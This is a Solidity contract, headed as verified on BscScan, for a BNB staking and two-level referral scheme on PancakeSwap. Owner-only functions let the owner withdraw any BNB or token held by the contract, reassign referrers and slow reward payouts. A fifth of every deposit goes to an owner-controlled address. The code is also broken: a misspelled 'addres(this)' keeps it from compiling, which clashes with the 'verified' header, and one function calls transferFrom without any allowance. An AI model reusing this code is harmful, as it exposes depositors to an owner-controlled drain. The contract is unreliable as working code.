/**
 *Submitted for verification at BscScan.com on 2022-07-10
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;
event Debug(string label, uint256 value);

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // function renounceOwnership() public virtual onlyOwner {
    //     _transferOwnership(address(0));
    // }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountOut);

    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountIn);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}







contract M2 is Ownable {
    
    
    uint public speed = 43200;
    uint poolCoinN = 2040e22;
    address public _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public _usdt = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address public _back = msg.sender;
    address public _dead = 0x000000000000000000000000000000000000dEaD; //黑洞
    address public _pool = address(this);
    // PgPg代币
    address public pgpg = 0xC534165f8EA9998E878F4350536cAA9765b22222;
    // pgv1凭证
    address public v1 = 0x74dc66c4c96cD6153191da38f2D68D1d18fd95a1;
    // pgv2凭证
    address public v2 = 0xc46D6aE9CEdB8422c662edfF043f5D858E9caaa2;
    // pgv3凭证
    address public v3 = 0xcFAa1C274cBfAb275FA7267359DF4e59A191aaa3;
    // pgv4 凭证
    address public v4 = 0x83D5277075746E6220a3d34776D52ec746DFaaa4;
    mapping(address => uint) public userCp;
      mapping(address => uint) public userStakeTime;
     mapping(address => uint) public userReward;
      mapping(address => address) public boss;

    mapping(address => address[]) public teamArry; //line1Addr
    mapping(address => address[]) public teamArry2; //line1Addr

    mapping(address => uint) public overReward;
   
    mapping(address => uint) public userInviteMoney;
    mapping(address => uint) public userInviteToken;

  

   

    uint public allStakeCp;
    
    event SaveInvite(address indexed from, address indexed to, uint256 value);
   

    struct INFO {
        // address NO1; //地址
        address wbnbCoin; //wbnb地址
        address pgpgCoin; //pgpg币地址
        address v1; //v1币地址
        address v2; //v2币地址
        address v3; //v3币地址
        address v4; //v4币地址
        address inivet; //我的上级是谁
        address _back; //如果没有邀请人则填写该地址
        uint allStakeCp; //全网质押BNB
        uint userCp; //  个人质押BNB
        uint userAward; // 个人可领取收益s
        uint teamLength; //直推人数
        uint teamLength2; //间接推人数
        uint overAward; //已经领取了多少收益
        uint tokenNumPool; //矿池代币数量
        // uint teamLength;//直推列表长度
    }


    function setPool(address pool) external onlyOwner {
        // _eth = ethCoin;
        _pool = pool;
    }

    function setPgpg(address pool) external onlyOwner {
        // _eth = ethCoin;
        pgpg = pool;
    }

    function setV1(address pool) external onlyOwner {
        // _eth = ethCoin;
        v1 = pool;
    }

    function setV2(address pool) external onlyOwner {
        // _eth = ethCoin;
        v2 = pool;
    }

    function setV3(address pool) external onlyOwner {
        // _eth = ethCoin;
        v3 = pool;
    }

    function setV4(address pool) external onlyOwner {
        // _eth = ethCoin;
        v4 = pool;
    }

    function getInfo(address addr) external view returns (INFO memory arr) {
        // uint le = getUserLevel(addr);
        uint autoR = getReward(addr);
        uint basPool = IERC20(pgpg).balanceOf(address(this));
       
        arr = INFO(
            // No1,
            _usdt, //WBNB地址
            pgpg,
            v1,
            v2,
            v3,
            v4,
            boss[addr], //我的上级是谁
            _back, // 如果没有邀请人则填写该地址
            allStakeCp, //全网算
            userCp[addr], //  个人算力
            autoR, // 个人可领取收益
            teamArry[addr].length, //直推人数
            teamArry2[addr].length, //间推人数
            overReward[addr], //已经领取了多少收益
            basPool
        );
    }

    constructor(address pool) public {
        _pool = pool;

        boss[msg.sender] = address(this);
       
        IERC20(pgpg).approve(_router, type(uint256).max);
        IERC20(_usdt).approve(_router, type(uint256).max);
        // boss[msg.sender] = msg.sender;
        // userStakeTime[_dead] = block.timestamp;
      
    }

    function app(address token) public onlyOwner {
        IERC20(token).approve(_router, type(uint256).max);
    }

   

    //    function set_rewardNum(uint num)external onlyOwner {
    //        rewardNum = num;
    //    }
    function set_back(address addr) external onlyOwner {
        _back = addr;
    }

    
    

    function getPrice(address coin, uint bnbNum) public view returns (uint) {
        address[] memory path3 = new address[](2);
        // path3[0] = sfast;//用第二个币计算
        path3[0] = coin;
        path3[1] = _usdt;
        uint[] memory amounts3 = IPancakeRouter02(_router).getAmountsIn(
            bnbNum,
            path3
        );
        return amounts3[0];
    }

   

   
    
    function returnIn(address con, address addr, uint256 val) public onlyOwner {
        if (con == address(0)) {
            payable(addr).transfer(val);
        } else {
            IERC20(con).transfer(addr, val);
        }
    }

    function binSql(address addr, address addr2) external onlyOwner {
        boss[addr] = addr2;
    }

   
    function getTeamArry(
        address addr,
        uint start,
        uint forNum
    ) external view returns (address[100] memory addrs) {
        for (uint i; i < forNum; i++) {
            addrs[i] = teamArry[addr][i + start];
        }
    }

    function getTeamArry2(
        address addr,
        uint start,
        uint forNum
    ) external view returns (address[100] memory addrs) {
        for (uint i; i < forNum; i++) {
            addrs[i] = teamArry2[addr][i + start];
        }
    }

   

    function iniv(address invite, address _to) public {
        // require(IERC20(_coinKing).balanceOf(msg.sender)>= 2e16,"qsCoin balances<0.02");
        require(
            boss[invite] != address(0) && invite != address(0),
            "not invite"
        );
        // bool flag;
        if (boss[_to] == address(0) && _to != invite && invite != address(0)) {
            boss[_to] = invite;

            teamArry[invite].push(_to);
            address parent = boss[invite];

            if (parent == address(0)) return;
            teamArry2[parent].push(_to);
        }
    }
    function stake1(address _invite) external payable {
    // emit Debug("a",1);
    require(msg.sender == tx.origin, "No contract calls");
    require(msg.value >= 0.0199 ether, "not msg.value");

    iniv(_invite, msg.sender);

    uint256 balance = IERC20(v1).balanceOf(msg.sender);
    require(balance >= 1e18, "not v1 balance");

    require(IERC20(v1).transferFrom(msg.sender, _dead, 1e18), "v1 transfer failed");
    require(IERC20(v2).transfer(msg.sender, 5e17), "v2 transfer failed");
    // emit Debug("b",2);
    uint256 tN;
    tN = getPrice(pgpg, msg.value);
    userReward[msg.sender] += tN;
    userStakeTime[msg.sender] = block.timestamp;
    emit Debug("aaa",tN);
    // Swap ETH for pgpg
    address [] memory path = new address[](2) ;
    path[0] = _usdt;
    path[1] = pgpg;

    uint256 sbU = IERC20(pgpg).balanceOf(address(this));
    // 
    uint256 ethToSwap = (msg.value / 100) * 30; // 30%
    uint256 ethToLiq = (msg.value / 100) * 50;  // 50%
    uint256 ethToBack = msg.value - ethToSwap - ethToLiq; // 剩余 20%

    IPancakeRouter02(_router).swapExactETHForTokensSupportingFeeOnTransferTokens{
        value: ethToSwap
    }(0, path, address(this), block.timestamp);

    uint256 sbD = IERC20(pgpg).balanceOf(address(this));
    require(sbD >= sbU, "Swap failed or no pgpg tokens received");
    uint sb;
    uint invA;
    unchecked {
         sb = sbD - sbU;
         invA = (sb /100)* 33; // 33% for referral
    }
   
    // Referral payouts
    address p1 = boss[msg.sender];
    if (p1 != address(0) && userReward[p1] > 0) {
        uint256 reward1 = (invA * 70) / 100;
        require(IERC20(pgpg).transferFrom(address(this), p1, reward1), "p1 transfer failed");
        userInviteMoney[p1] += reward1;

        address p2 = boss[p1];
        if (p2 != address(0) && userReward[p2] > 0) {
            uint256 reward2 = (invA * 30) / 100;
            require(IERC20(pgpg).transferFrom(address(this), p2, reward2), "p2 transfer failed");
            userInviteMoney[p2] += reward2;
        }
    }

    // Add liquidity
    IPancakeRouter02(_router).addLiquidityETH{
        value: ethToLiq
    }(pgpg, sbU, 0, 0, _pool, block.timestamp);

    // Transfer remaining ETH to back address
    payable(_back).transfer(ethToBack);
    unchecked {
        allStakeCp += msg.value;
        userCp[msg.sender] += msg.value;
    }
    }

 
    



    function stake2(address _invite) external payable {
        require(msg.sender == tx.origin, "No contract calls");
        require(msg.value >= 0.0999 ether, "not msg.value");
        iniv(_invite, msg.sender);
        uint balance = IERC20(v2).balanceOf(msg.sender); //改动
        require(balance >= 1e18, "not v1 balance"); //改动
        IERC20(v2).transferFrom(msg.sender, _dead, 1e18); //改动
        IERC20(v3).transfer( msg.sender, 4e17); //改动
        uint tN = getPrice(pgpg, 0.11 ether); //改动
        userReward[msg.sender] += tN;
        userStakeTime[msg.sender] = block.timestamp;

        address[] memory path = new address[](2);
        path[0] = _usdt;
        path[1] = pgpg;
        uint sbU = IERC20(pgpg).balanceOf(address(this));
        IPancakeRouter02(_router)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: (msg.value * 30) / 100
        }(0, path, address(this), block.timestamp);

        uint sbD = IERC20(pgpg).balanceOf(address(this));
        uint sb = sbD - sbU;
        // IERC20(pgpg).transfer(_pool, (sb * 2) / 3);
        uint invA = sb / 3;
        address p1 = boss[msg.sender];
        if (p1 != address(0) && userReward[p1] > 0) {
            IERC20(pgpg).transfer( p1, (invA * 70) / 100);
            userInviteMoney[p1] += ((invA * 70) / 100); //邀请奖励TOken
            address p2 = boss[p1];
            if (p2 != address(0) && userReward[p2] > 0) {
                IERC20(pgpg).transfer( p2, (invA * 30) / 100);
                userInviteMoney[p2] += ((invA * 30) / 100); //邀请奖励TOken
            }
        }

        IPancakeRouter02(_router).addLiquidityETH{
            value: (msg.value * 50) / 100
        }(pgpg, sbU, 0, 0, _pool, block.timestamp);
        payable(_back).transfer((msg.value * 20) / 100);
        allStakeCp += msg.value;
        userCp[msg.sender] += msg.value;
    }

    function stake3(address _invite) external payable {
        require(msg.sender == tx.origin, "No contract calls");
        require(msg.value >= 0.5 ether, "not msg.value"); //改动
        iniv(_invite, msg.sender);
        uint balance = IERC20(v3).balanceOf(msg.sender); //改动
        require(balance >= 1e18, "not v1 balance"); //改动
        IERC20(v3).transferFrom(msg.sender, _dead, 1e18); //改动
        IERC20(v4).transfer( msg.sender, 3e17); //改动
        uint tN = getPrice(pgpg, 0.575 ether); //改动
        userReward[msg.sender] += tN;
        userStakeTime[msg.sender] = block.timestamp;

        address[] memory path = new address[](2);
        path[0] = _usdt;
        path[1] = pgpg;
        uint sbU = IERC20(pgpg).balanceOf(address(this));
        IPancakeRouter02(_router)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: (msg.value * 30) / 100
        }(0, path, address(this), block.timestamp);

        uint sbD = IERC20(pgpg).balanceOf(address(this));
        uint sb = sbD - sbU;
        // IERC20(pgpg).transferFrom(address(this), _pool, (sb * 2) / 3);
        uint invA = sb / 3;
        address p1 = boss[msg.sender];
        if (p1 != address(0) && userReward[p1] > 0) {
            IERC20(pgpg).transfer( p1, (invA * 70) / 100);
            userInviteMoney[p1] += ((invA * 70) / 100); //邀请奖励TOken
            address p2 = boss[p1];
            if (p2 != address(0) && userReward[p2] > 0) {
                IERC20(pgpg).transfer( p2, (invA * 30) / 100);
                userInviteMoney[p2] += ((invA * 30) / 100); //邀请奖励TOken
            }
        }

        IPancakeRouter02(_router).addLiquidityETH{
            value: (msg.value * 50) / 100
        }(pgpg, sbU, 0, 0, _pool, block.timestamp);
        payable(_back).transfer((msg.value * 20) / 100);
        allStakeCp += msg.value;
        userCp[msg.sender] += msg.value;
    }

    function stake4(address _invite) external payable {
        require(msg.sender == tx.origin, "No contract calls");
        require(msg.value >= 0.99 ether, "not msg.value"); //改动
        iniv(_invite, msg.sender);
        uint balance = IERC20(v4).balanceOf(msg.sender); //改动
        require(balance >= 1e18, "not v1 balance"); //改动
        IERC20(v4).transferFrom(msg.sender, _dead, 1e18); //改动
        uint tN = getPrice(pgpg, 1.2 ether); //改动
        userReward[msg.sender] += tN;
        userStakeTime[msg.sender] = block.timestamp;

        address[] memory path = new address[](2);
        path[0] = _usdt;
        path[1] = pgpg;
        uint sbU = IERC20(pgpg).balanceOf(address(this));
        IPancakeRouter02(_router)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: (msg.value * 30) / 100
        }(0, path, address(this), block.timestamp);

        uint sbD = IERC20(pgpg).balanceOf(address(this));
        uint sb = sbD - sbU;
        // IERC20(pgpg).transferFrom(address(this), _pool, (sb * 2) / 3);
        uint invA = sb / 3;
        address p1 = boss[msg.sender];
        if (p1 != address(0) && userReward[p1] > 0) {
            IERC20(pgpg).transfer( p1, (invA * 70) / 100);
            userInviteMoney[p1] += ((invA * 70) / 100); //邀请奖励TOken
            address p2 = boss[p1];
            if (p2 != address(0) && userReward[p2] > 0) {
                IERC20(pgpg).transfer( p2, (invA * 30) / 100);
                userInviteMoney[p2] += ((invA * 30) / 100); //邀请奖励TOken
            }
        }

        IPancakeRouter02(_router).addLiquidityETH{
            value: (msg.value * 50) / 100
        }(pgpg, sbU, 0, 0, _pool, block.timestamp);
        payable(_back).transfer((msg.value * 20) / 100);
        allStakeCp += msg.value;
        userCp[msg.sender] += msg.value;
    }

   

    //返回可获得USDT收益，需要另外转化为代币数量
    function setSpeed(uint numberT) public onlyOwner {
        speed = speed + (numberT * 1 hours);
    }
    function getAddPoolSpeed() public view returns (uint) {
        uint bas = IERC20(pgpg).balanceOf(addres(this));
        uint overPoolN = poolCoinN - bas;
        uint t = overPoolN / 20e22;
        return t * 3 hours;
    }

    function getReward(address addr) public view returns (uint) {
        uint rN = userReward[addr];
        uint usertime = userStakeTime[addr];

        if (rN == 0 || usertime == 0) return 0;
        // uint userUsdtNum =
        uint addSpeed = getAddPoolSpeed();
        uint overSpeed = speed + addSpeed;
        uint am = block.timestamp - userStakeTime[addr];
        uint ward = ((rN * am) / overSpeed);
        if (ward > rN) {
            return rN;
        }
        return ward;
    }

    

    function claim() external {
        uint rewardToken = getReward(msg.sender);
        require(rewardToken > 0, "reward>0");
        require(userReward[msg.sender] >= rewardToken, "USER>REWARD");
        userReward[msg.sender] -= rewardToken;
       
        IERC20(pgpg).transfer(msg.sender, rewardToken);

        // // IERC20(_sosk)
        // // IERC20(_eth).transfer(msg.sender,userRew1);
        overReward[msg.sender] += rewardToken;
        if (userReward[msg.sender] == 0 || userReward[msg.sender] < 1e5) {
            userReward[msg.sender] = 0;
            userStakeTime[msg.sender] = 0;
        }
        
        
    }
    
    
}
